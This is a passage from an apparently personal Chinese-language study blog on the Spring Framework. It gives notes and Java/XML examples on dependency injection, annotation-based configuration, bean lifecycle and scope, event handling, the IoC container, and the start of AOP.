spellChecker;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">TextEditor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      spellChecker = <span class="keyword">new</span> SpellChecker();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在这里所做的是在TextEditor和SpellChecker之间创建一个依赖项。在控制方案反转的情况下，我们将改为执行以下操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">TextEditor</span><span class="params">(SpellChecker spellChecker)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.spellChecker = spellChecker;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpellChecker将独立实现，并将在TextEditor实例化时提供给TextEditor，整个过程由Spring框架控制</p><p>在这里，我们从TextEditor中删除了总控制权，并将其保留在其他地方（即XML配置文件），并且依赖项（即SpellChecker类）已通过<strong>Class Constructor</strong>注入到TextEditor<strong>类中</strong>。因此，控制流已通过依赖注入<code>（DI）“反转”</code>，因为您已将依赖有效地委派给了某些外部系统。</p><p>注入依赖项的第二种方法是通过TextEditor类的<strong>Setter方法</strong>，在该<strong>方法</strong>中，我们将创建SpellChecker实例。此实例将用于调用setter方法以初始化TextEditor的属性。</p><table><thead><tr><th>序号</th><th>依赖注入类型和描述</th></tr></thead><tbody><tr><td>1   基于构造函数的依赖注入</td><td>当容器调用带有多个参数的类构造函数时，将完成基于构造函数的DI，每个参数表示另一个类的依赖；</td></tr><tr><td>2  基于Setter的依赖注入</td><td>基于设置器的DI是通过调用无参数构造函数或无参数静态工厂方法以实例化您的bean之后，在您的bean上调用setter()方法来完成的</td></tr></tbody></table><p>可以混合使用基于构造函数的DI和基于Setter的DI</p><p>根据经验来说，对于强制性依赖项使用构造函数参数，对于可选的依赖项使用setter方法</p><h4 id="内部bean"><a href="#内部bean" class="headerlink" title="内部bean"></a>内部bean</h4><p><protery/>或<construcotr-arg/>元素内的<bean/>元素称为内部bean</p><p>example:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">"1.0"</span> encoding = <span class="string">"UTF-8"</span>?&gt;</span><br><span class="line"></span><br><span class="line">&lt;beans xmlns = <span class="string">"http://www.springframework.org/schema/beans"</span></span><br><span class="line">   xmlns:xsi = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">   xsi:schemaLocation = <span class="string">"http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span><br><span class="line"></span><br><span class="line">   &lt;bean id = <span class="string">"outerBean"</span> <span class="class"><span class="keyword">class</span> </span>= <span class="string">"..."</span>&gt;</span><br><span class="line">      &lt;property name = <span class="string">"target"</span>&gt;</span><br><span class="line">         &lt;bean id = <span class="string">"innerBean"</span> <span class="class"><span class="keyword">class</span> </span>= <span class="string">"..."</span>/&gt;</span><br><span class="line">      &lt;/property&gt;</span><br><span class="line">   &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h4 id="Injecting-Collection"><a href="#Injecting-Collection" class="headerlink" title="Injecting Collection"></a>Injecting Collection</h4><p>传递`Java Collection类型(例如List,Set,Map和Properties)之类的复数值, 为了处理这种情况,Spring提供了四种类型的集合配置元素,</p><table><thead><tr><th>Sr.No</th><th>Element &amp; Description</th></tr></thead><tbody><tr><td>1</td><td><strong><list></strong>This helps in wiring ie injecting a list of values, allowing duplicates.</td></tr><tr><td>2</td><td><strong><set></strong>This helps in wiring a set of values but without any duplicates.</td></tr><tr><td>3</td><td><strong><map></strong>This can be used to inject a collection of name-value pairs where name and value can be of any type.</td></tr><tr><td>4</td><td><strong><props></strong>This can be used to inject a collection of name-value pairs where the name and value are both Strings.</td></tr></tbody></table><p>可以手机用<list>或<set>连接java.util.Collection或数组的任何实现</p><p>(a)传递集合的直接值</p><p>(b)传递bean的引用作为集合元素之一</p><p>在<property></property> 标签中使用<list> 或<set>等标签</p><h5 id="注入空和空字符串值"><a href="#注入空和空字符串值" class="headerlink" title="注入空和空字符串值"></a>注入空和空字符串值</h5><p>如果您需要传递一个空字符串作为值，则可以按以下方式传递它：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="built_in">id</span> = <span class="string">"..."</span> <span class="built_in">class</span> = <span class="string">"exampleBean"</span>&gt;</span><br><span class="line">   &lt;<span class="keyword">property</span> <span class="built_in">name</span> = <span class="string">"email"</span> value = <span class="string">""</span>/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>上面的示例等效于Java代码：exampleBean.setEmail（“”）</p><p>如果需要传递NULL值，则可以按以下方式传递它-</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id = <span class="string">"..."</span> <span class="keyword">class</span> = "<span class="symbol">exampleBean</span>"&gt;</span><br><span class="line">   &lt;<span class="symbol">property</span> <span class="symbol">name</span> = "<span class="symbol">email</span>"&gt;&lt;<span class="symbol">null</span>/&gt;&lt;/<span class="symbol">property</span>&gt;</span><br><span class="line">&lt;/<span class="symbol">bean</span>&gt;</span><br></pre></td></tr></table></figure><p>上面的示例等效于Java代码: exampleBean.setEmail(null)</p><h4 id="auto-Wiring"><a href="#auto-Wiring" class="headerlink" title="auto-Wiring"></a>auto-Wiring</h4><p>自动连线 </p><p>Spring自动装备协作bean之间的关系,而无需是由<constructor-arg> 和<property> 标签</p><h4 id="基于注解的配置"><a href="#基于注解的配置" class="headerlink" title="基于注解的配置"></a>基于注解的配置</h4><p>使用注释配置依赖项注入</p><p>注释注入在XML注入之间执行,因此,对于通过两种方法俩连接的属性,后一种配置将覆盖前者</p><p>默认情况下,Spring容器中的注释接线未打开.因此,在使用基于注解的连接之前,需要在Spring配置文件之中启用它 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:context</span> = <span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context/spring-context-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- bean definitions go here --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置了<a href="contex:annotation-config/">contex:annotation-config/</a> 就可以开始注释代码</p><p>Let us look at a few importment annotations to understand how they work -</p><table><thead><tr><th></th><th>注释于说明</th></tr></thead><tbody><tr><td>1  @Required</td><td>用于bean属性设置器方法</td></tr><tr><td>2  @Autowried</td><td>应用于属性设置器方法,非设置器方法,构造函数和属性</td></tr><tr><td>3  @Qualifier</td><td>与@Autowried一起使用,可以通过要连接的确切bean来消除混淆</td></tr><tr><td>4  JSR_250 Annotations</td><td>Spring支持基于JSR-250的注释,其中包括@Resource, @PostConstruct和 @PreDestory 注释</td></tr></tbody></table><h5 id="Requtire"><a href="#Requtire" class="headerlink" title="@Requtire"></a>@Requtire</h5><p>在属性上添加@Required 将必须为此属性(变量)传递值(在Bean.xml文件中)</p><h5 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h5><p>设置在 setter方法上则不用在bean.xml文件中添加其<bean>标签</p><p>比如用在bean中bean里,则不用再写到内部bean中 ,</p><p><img src="../images/java_web/image-20210404172934053.png" alt="image-20210404172934053"></p><p>使用后</p><p><img src="../images/java_web/image-20210404172921819.png" alt="image-20210404172921819"></p><p><a href="https://www.tutorialspoint.com/spring/spring_autowired_annotation.htm" target="_blank" rel="noopener">剩下用法参考</a></p><p>直接用在属性上 , 摆脱setter方法 当您使用<property>传递自动装配属性的值时，Spring会自动为这些属性分配传递的值或引用。</p><p>用在构造函数上  构造函数@Autowired批注知识即使在XML文件中配置Bean时不适用任何<contructor-arg>元素,也应在创建Bean时自动构造该构造函数</p><p>可以在构造函数内直接创建对象</p><p>@Autowired with(required=false)选项</p><p>默认情况下，@ Autowired批注表示与@Required批注类似，需要依赖项，但是，可以通过对@Autowired使用<strong>（required = false）</strong>选项来关闭默认行为。</p><p>即使您没有为age属性传递任何值，但仍将要求name属性，下面的示例仍然有效。您可以自己尝试该示例，因为除了仅更改了<strong>Student.java</strong>文件之外，它与@Required注释示例相似。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tutorialspoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> Integer age;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Autowired</span>(required=<span class="keyword">false</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Configuration和-Bean批注"><a href="#Configuration和-Bean批注" class="headerlink" title="Configuration和@Bean批注"></a>Configuration和@Bean批注</h4><p>用@Configuration注释一个类表示该类可以被Spring Ioc容器用作定义Bean的原 @Bean注释告诉Spring使用@Bean注释的方法将返回一个对象,该对象应在Sprign应用程序的上下文中注册为Bean,最简单的@Configuration类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloConfiguration</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloSpring <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelloSpring();</span><br><span class="line">        <span class="comment">//这里的HelloSpring 是已经写好的类 ,定义好了setter方法和属性</span></span><br><span class="line">        <span class="comment">//也可以直接创建本类的对象  return  HelloConfiguration() </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等效于在XML中配置</p><bean id="hello" class="location.HelloConfiguration"/><p>方法名称用@Bean标注为Bean ID,它创建并返回实际的Bean,类中可以有多个@Bean的声明,一旦定义了配置类,就可以使用 <em>AnnotationConfigApplicationContex</em> 将他们加载出来并提供给Spring容器 </p><p>使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     ApplicationContext context = <span class="keyword">new</span> AnnotationConfigApplicationContext(HelloConfiguration<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">     HelloSpring helloSpring = context.getBean(HelloSpring<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">     helloSpring.setMessage1(<span class="string">"你好 @bean 注释"</span>);</span><br><span class="line">     helloSpring.getMessage1();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>您可以按如下方式加载各种配置类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   AnnotationConfigApplicationContext ctx = <span class="keyword">new</span> AnnotationConfigApplicationContext();</span><br><span class="line"></span><br><span class="line">   ctx.register(AppConfig<span class="class">.<span class="keyword">class</span>, <span class="title">OtherConfig</span>.<span class="title">class</span>)</span>;</span><br><span class="line">   ctx.register(AdditionalConfig<span class="class">.<span class="keyword">class</span>)</span>; </span><br><span class="line">   ctx.refresh();</span><br><span class="line"></span><br><span class="line">   MyService myService = ctx.getBean(MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   myService.doStuff();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@Import  Annotation</p><p>@Import annotation 允许直接从其他 Configuration类中加载@Bean定义(denfinition)</p><p>as follows(如下)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigA</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> A <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> A(); </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can import above Bean declaration in another Bean Declaration as follows −</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Import</span>(ConfigA<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">ConfigB</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> B <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> B(); </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在,不需要实例化时去指定 ConfigA和Config ,只需要提供ConfigB</p><p>as follows </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   ApplicationContext ctx = <span class="keyword">new</span> AnnotationConfigApplicationContext(ConfigB<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// now both beans A and B will be available...</span></span><br><span class="line">   A a = ctx.getBean(A<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   B b = ctx.getBean(B<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="生命周期回调"><a href="#生命周期回调" class="headerlink" title="生命周期回调"></a>生命周期回调</h5><p>@Bean注释支持指定任意的初始化和销毁方法 ,像咋Spring XML 上的 init-mehtod 和 destroy-method 属性一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// initialization logic</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// destruction logic</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span> </span>&#123;</span><br><span class="line">   <span class="meta">@Bean</span>(initMethod = <span class="string">"init"</span>, destroyMethod = <span class="string">"cleanup"</span> )</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Foo <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Foo();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="指定Bean范围"><a href="#指定Bean范围" class="headerlink" title="指定Bean范围"></a>指定Bean范围</h5><p>默认范围为单例,但可以使用@Bean 注释(annotation)重写它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span></span>&#123;</span><br><span class="line"> <span class="meta">@Bean</span></span><br><span class="line"> <span class="meta">@Scope</span>(<span class="string">"property"</span>)</span><br><span class="line"> <span class="function"><span class="keyword">public</span> Foo <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="function">reuturn <span class="title">Foo</span><span class="params">()</span></span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Event-Handing-in-Spring"><a href="#Event-Handing-in-Spring" class="headerlink" title="Event Handing in Spring"></a>Event Handing in Spring</h3><p>事件处理</p><p>The  core(核心) of Spring is the ApplicationContext ,which manages the complete life cycle(周期) of the beans.</p><p>loding beans时, ApplicationContext 发布某些类型的事件 . 例如 a ContextStartedEvent is published when the context is started and ContextStoppedEvent is published when the context is stopped</p><p>ApplicationContext 通过ApplicationEvent class和 ApplicationListen interface 提供事件处理,如果bean implements the ApplicationListener</p><table><thead><tr><th align="center">Sr.No.</th><th align="center">Spring Built-in Events &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>ContextRefreshedEvent</strong>This event is published when the <em>ApplicationContext</em> is either initialized or refreshed. This can also be raised using the refresh() method on the <em>ConfigurableApplicationContext</em> interface.</td></tr><tr><td align="center">2</td><td align="center"><strong>ContextStartedEvent</strong>This event is published when the <em>ApplicationContext</em> is started using the start() method on the <em>ConfigurableApplicationContext</em> interface. You can poll your database or you can restart any stopped application after receiving this event.</td></tr><tr><td align="center">3</td><td align="center"><strong>ContextStoppedEvent</strong>This event is published when the <em>ApplicationContext</em> is stopped using the stop() method on the <em>ConfigurableApplicationContext</em> interface. You can do required housekeep work after receiving this event.</td></tr><tr><td align="center">4</td><td align="center"><strong>ContextClosedEvent</strong>This event is published when the <em>ApplicationContext</em> is closed using the close() method on the <em>ConfigurableApplicationContext</em> interface. A closed context reaches its end of life; it cannot be refreshed or restarted.</td></tr><tr><td align="center">5</td><td align="center"><strong>RequestHandledEvent</strong>This is a web-specific event telling all beans that an HTTP request has been serviced.</td></tr></tbody></table><p>Spring的事件处理是单线程的,因此,如果事件被发布,则直到并且除非所有接收者都收到消息,否则流程将被阻塞并且流程不会继续. 因此,如果要使用事件处理,则在设计应用程序时十分小心 be careful</p><h4 id="监听上下文事件"><a href="#监听上下文事件" class="headerlink" title="监听上下文事件"></a>监听上下文事件</h4><p>要侦听上下文事件,bean应该实现ApplicationListener接口, 该接口只有一个方法 onApplicationEvent(), </p><p><img src="../images/java_web/image-20210404212310883.png" alt="image-20210404212310883"></p><p><img src="../images/java_web/image-20210404212316459.png" alt="image-20210404212316459"></p><p>上面实现了两个Spring中定义的事件 ,进行了简单写入</p><p><img src="../images/java_web/image-20210404212517061.png" alt="image-20210404212517061"></p><p>ApplicationContex对象通过 start()方法和stop()方法 创建 开始和结束事件</p><h3 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h3><p>编写和发布自己的自定义事件需要采取许多步骤,  将跟随教程发布和处理Cutstom Spring Events</p><table><thead><tr><th></th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>创建一个名称为<em>SpringExample</em>的项目，并在创建的项目的<strong>src</strong>文件夹下创建一个<em>com.tutorialspoint</em>包。所有类都将在此程序包下创建。</td></tr><tr><td>2</td><td>使用“<em>添加外部JAR”</em>选项添加所需的Spring库，如“ <em>Spring Hello World示例”</em>一章中所述。</td></tr><tr><td>3</td><td>通过扩展<strong>ApplicationEvent</strong>创建事件类<em>CustomEvent</em>。此类必须定义一个默认构造函数，该构造函数应继承ApplicationEvent类的构造函数。</td></tr><tr><td>4</td><td>一旦定义了事件类，就可以从任何类中发布它，让我们说一下实现<em>ApplicationEventPublisherAware的*</em>EventClassPublisher*。您还需要在XML配置文件中将该类声明为Bean，以便容器可以将Bean标识为事件发布者，因为它实现了ApplicationEventPublisherAware接口。</td></tr><tr><td>5</td><td>可以在一个类中处理已发布的事件，比方说<em>EventClassHandler</em>，它实现<em>ApplicationListener</em>接口，并为自定义事件实现<em>onApplicationEvent</em>方法。</td></tr><tr><td>6</td><td>在<strong>src</strong>文件夹下创建bean配置文件<em>Beans.xml</em>，并在<em>MainApp</em>类中创建Spring应用程序。</td></tr><tr><td>7</td><td>最后一步是创建所有Java文件和Bean配置文件的内容，然后按以下说明运行应用程序。</td></tr></tbody></table><p>通过上述步骤可以创建一个自己的事件并发布</p><p>通过教程简单的创建了一个小的自定义事件 ,但对于其原理和用处不是很明白,所以goole了一下</p><h4 id="Spring中自定义Event事件的使用和浅析"><a href="#Spring中自定义Event事件的使用和浅析" class="headerlink" title="Spring中自定义Event事件的使用和浅析"></a>Spring中自定义Event事件的使用和浅析</h4><p><a href="https://blog.csdn.net/tuzongxun/article/details/53637159" target="_blank" rel="noopener">参考</a></p><p>参考文章内提到了事件驱动模型 </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">事件驱动模型也就是我们常说的观察者，或者发布-订阅模型；理解它的几个关键点：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> 首先是一种对象间的一对多的关系；最简单的如交通信号灯，信号灯是目标（一方），行人注视着信号灯（多方）；</span><br><span class="line"><span class="number">2</span> 当目标发送改变（发布），观察者（订阅者）就可以接收到改变；</span><br><span class="line"><span class="number">3</span> 观察者如何处理（如行人如何走，是快走/慢走/不走，目标不会管的），目标无需干涉；所以就松散耦合了它们之间的关系。</span><br></pre></td></tr></table></figure><p>该例子将时间的发布比喻为信号灯, 也就是说事件的发布相当于信号灯</p><p>自定义事件需要继承Application类, 相当于给信号灯通电,使信号灯可以亮起 </p><p>创建一个监听类, 需要实现ApplicationListener接口 ,并且重写 onApplicationEvent()方法, 也就是提供了信号的意思, 比如绿灯行,红灯听 监听类可以是多方的, 因为红绿灯可以被多个人看到</p><p>第三步,需要一个控制信号灯变化的东西,也就是控制信号灯的内容  红黄绿灯的程序和电路</p><p>通过main方法将静止的灯和人动起来</p><p>行人看灯,电路通电</p><p>可以通过实验在写一个 监听类</p><h3 id="IoC容器"><a href="#IoC容器" class="headerlink" title="IoC容器"></a>IoC容器</h3><p>Spring容器是Spring框架的核心，容器将会创建对象，将他们连接在一起，对其进行配置，并管理从创建到销毁的整个生命周期</p><p>Spring容器使用DI来管理组成应用程序的组件。这些对象称为Spring Bean</p><p>容器通过读取提供的配置元数据来获取有关要实例化，配置和组装哪些对象的指令。配置元数据可以用XML，Java批注或Java代码表示。下图代表了Spring的工作原理的高级视图。Spring IoC容器利用Java POJO类和配置元数据来生成完全配置且可执行的系统或应用程序。</p><p><img src="../images/java_web/spring_ioc_container.jpg" alt="春季IoC容器"></p><p>Spring提供了两种不同类型的容器</p><table><thead><tr><th align="center">序号</th><th align="center">容器及说明</th></tr></thead><tbody><tr><td align="center">1个</td><td align="center"><a href="https://www.tutorialspoint.com/spring/spring_beanfactory_container.htm" target="_blank" rel="noopener">Spring BeanFactory容器</a>这是为DI提供基本支持的最简单的容器，由<em>org.springframework.beans.factory.BeanFactory</em>接口定义。Spring仍存在BeanFactory及其相关接口，例如BeanFactoryAware，InitializingBean，DisposableBean，目的是向后兼容与Spring集成的大量第三方框架。</td></tr><tr><td align="center">2个</td><td align="center"><a href="https://www.tutorialspoint.com/spring/spring_applicationcontext_container.htm" target="_blank" rel="noopener">Spring ApplicationContext容器</a>此容器添加了更多特定于企业的功能，例如从属性文件解析文本消息的功能以及将应用程序事件发布到感兴趣的事件侦听器的功能。该容器由<em>org.springframework.context.ApplicationContext</em>接口定义。</td></tr></tbody></table><p>所述<em>的ApplicationContext</em>容器包括所有功能<em>的BeanFactory</em>容器，因此，通常建议在<em>Bean工厂</em>。BeanFactory仍可用于轻量级应用程序，例如移动设备或基于Applet的应用程序，这些应用程序的数据量和速度非常重要。</p><h4 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h4><p>Aspect oriented programming(AOP)</p><table><thead><tr><th align="center">r.No</th><th align="center">Terms &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>Aspect</strong>  This is a module which has a set of APIs providing cross-cutting requirements. For example, a logging module would be called AOP aspect for logging. An application can have any number of aspects depending on the requirement.</td></tr><tr><td align="center">2</td><td align="center">*<em>Join point *</em> This 